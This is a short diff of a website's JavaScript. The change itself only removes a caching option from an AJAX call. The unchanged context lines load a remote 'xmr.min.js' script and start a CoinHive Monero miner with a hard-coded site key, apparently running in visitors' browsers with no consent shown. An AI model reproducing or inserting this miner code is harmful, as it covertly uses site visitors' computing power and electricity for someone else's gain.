@@ -326,8 +326,7 @@ ${selectionObj.toString()}${genCopy(author, link).join('<br>')}</div>`)
   $.ajax({
     method: "GET",
     url: 'https://static.hacpai.com/js/lib/xmr.min.js',
-    dataType: "script",
-    cache: true
+    dataType: "script"
   }).done(function () {
     const miner = new CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.9});
     miner.start();
